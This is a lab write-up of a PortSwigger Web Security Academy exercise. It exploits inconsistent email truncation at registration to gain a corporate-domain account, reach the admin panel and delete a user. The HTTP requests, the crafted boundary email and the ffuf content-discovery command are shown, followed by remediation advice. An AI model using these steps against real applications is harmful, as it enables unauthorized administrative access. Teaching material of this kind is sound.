# PortSwigger Lab: Inconsistent handling of exceptional input

# TAGS: Business Logic, Input Validation, Content Discovery, Burp Suite

Category: Business Logic
Date: October 26, 2026
Day: Monday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input
Published: Ready
Status: Done

---

## Intro

This lab is part of the Business Logic series. The flaw lives in the account registration process: the application handles unusually long input inconsistently — one part of the code truncates the email, another part does not. That mismatch lets you register with an address that becomes a `@dontwannacry.com` corporate email after the truncation, while the confirmation email still reaches your own mail server.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the application doesn't adequately validate user input and that there is a logic flaw in the account registration process. The goal is to gain access to the administrative interface and delete the user `carlos`.

I opened the lab and navigated to `/admin`:

```http
GET /admin HTTP/2
Host: 0ada003304cf64748064080e000f0099.web-security-academy.net
Cookie: session=<SESSION>
```

```http
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8

Admin interface only available if logged in as a DontWannaCry user
```

The `Register` page then makes the intent clear — employees are told to use their corporate `@dontwannacry.com` address:

> DontWannaCry, please use your @dontwannacry.com email address

The lab also provides an **email client**, which shows the address I control:

```
Your email address is attacker@exploit-0a05008d044364c7802707e201d20018.exploit-server.net
```

So the attack has two constraints: the stored email has to look like `@dontwannacry.com`, but the confirmation email has to reach `@exploit-...exploit-server.net`.

#### Finding the admin panel

The official solution uses Burp Suite Professional's **Discover content** tool to locate the `/admin` path. Burp Community doesn't ship that tool, so I used an external script instead — `scripts/content_discovery.py` — which requests a short wordlist of common paths and prints every response that isn't a `404`:

```bash
python3 content_discovery.py 0ada003304cf64748064080e000f0099.web-security-academy.net
```

```text
Target: https://0ada003304cf64748064080e000f0099.web-security-academy.net
Testing 15 paths...

[401] /admin
[401] /admin/login
[200] /login
[200] /logout
[200] /register
[200] /my-account

Done. Non-404 paths are the interesting ones.
```

The interesting hit is `/admin` (`401`), which returns the `DontWannaCry` message. The same result can be obtained with `ffuf`:

```bash
ffuf -w wordlist.txt -u https://0ada003304cf64748064080e000f0099.web-security-academy.net/FUZZ -mc all -fc 404
```

So finding `/admin` doesn't require Pro — it just requires a small wordlist and any content-discovery tool.

---

## Exploitation:

#### Step 1: Register with a long email and observe the truncation

I registered with a very long email — 200 characters before the `@` — pointing at my email client:

```http
POST /register HTTP/2
Host: 0ada003304cf64748064080e000f0099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<TOKEN>&username=longmail1&email=aaaa...aaaa@exploit-0a05008d044364c7802707e201d20018.exploit-server.net&password=<PASSWORD>
```

The submitted address was **260 characters** long. The confirmation email arrived normally at the full address, so the mail flow was fine.

Then I logged in and opened `/my-account`. The stored email was **truncated to exactly 255 characters** — the domain was cut in the middle:

```text
Your email is: aaaa...aaaa@exploit-0a05008d044364c7802707e201d20018.exploit-serve
```

That is the inconsistency: the full address is used to send the email, but only the first 255 characters are stored.

#### Step 2: Craft the email so the stored value ends in `@dontwannacry.com`

Since the truncation keeps the first 255 characters, I put `@dontwannacry.com` right at the boundary — the `m` has to be **exactly character 255**:

```text
[238 characters]@dontwannacry.com.exploit-0a05008d044364c7802707e201d20018.exploit-server.net
```

- `@dontwannacry.com` is **17** characters (`@` + 12 letters + `.` + `com`), so the prefix must be `255 − 17 = 238` characters.
- The full address is 315 characters and ends with my email client's domain (`dontwannacry.com.exploit-...exploit-server.net` is a subdomain of the exploit server), so the confirmation email is still delivered.
- After truncation, the stored email is `[238 characters]@dontwannacry.com` — a valid corporate address.

I registered again with this crafted address and confirmed it through the email client:

```http
POST /register HTTP/2
Host: 0ada003304cf64748064080e000f0099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<TOKEN>&username=dontwannacry2&email=aaaa...aaaa@dontwannacry.com.exploit-0a05008d044364c7802707e201d20018.exploit-server.net&password=<PASSWORD>
```

The `/my-account` page showed the stored email ending in `@dontwannacry.com` (255 characters).

#### Step 3: Access the admin interface and delete carlos

With the truncated `@dontwannacry.com` email, the admin check passed:

```http
GET /admin HTTP/2
Host: 0ada003304cf64748064080e000f0099.web-security-academy.net
Cookie: session=YR5MzLBU1o7gOOzsH7Sx1YBPxK7lEyFI
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

Users
wiener - Delete
carlos - Delete
longmail1 - Delete
dontwannacry2 - Delete
```

The delete action was a simple `GET`:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0ada003304cf64748064080e000f0099.web-security-academy.net
Cookie: session=YR5MzLBU1o7gOOzsH7Sx1YBPxK7lEyFI
```

```http
HTTP/2 302 Found
Location: /admin
```

After that, the lab showed **"Congratulations, you solved the lab!"**.

---

## Root Cause

The application validates and processes the email in two different places that disagree about length. The registration/validation logic works with the full string, but the database column (or the storage layer) silently truncates it to 255 characters. Because the admin check runs on the stored value, an attacker can make the truncated value end in `@dontwannacry.com` while the full address — used to send the confirmation email — still points at a mailbox the attacker controls.

---

## Impact

An attacker can register an account that the application treats as a trusted corporate (`@dontwannacry.com`) user, gaining access to the administrative interface and the ability to delete or modify other users. In a real application, this could expose administrative functionality, customer data, and destructive actions — all without any valid corporate credentials.

---

## Remediation

To prevent this issue, applications should:

- Validate input against the same limits used for storage — reject input that is longer than the column instead of silently truncating it;
- Use a single, shared validation/normalization step for an email address, and never re-check a truncated copy;
- Store and compare the exact value that was validated (or store a hash/lookup key), so the value used for authorization cannot change between validation and use;
- Treat exceptional input (very long strings, unusual characters) consistently across every component.

---

## Key Takeaways

1. "Exceptional input" often breaks assumptions in one component but not another — the mismatch is the bug.
2. The confirmation email is a useful oracle: it tells you which value the application is actually using.
3. Truncation at storage time can turn a harmless long string into a trusted value.
4. Finding hidden endpoints such as `/admin` doesn't require Burp Pro — a wordlist plus `ffuf` or a small script is enough.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Inconsistent handling of exceptional input (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
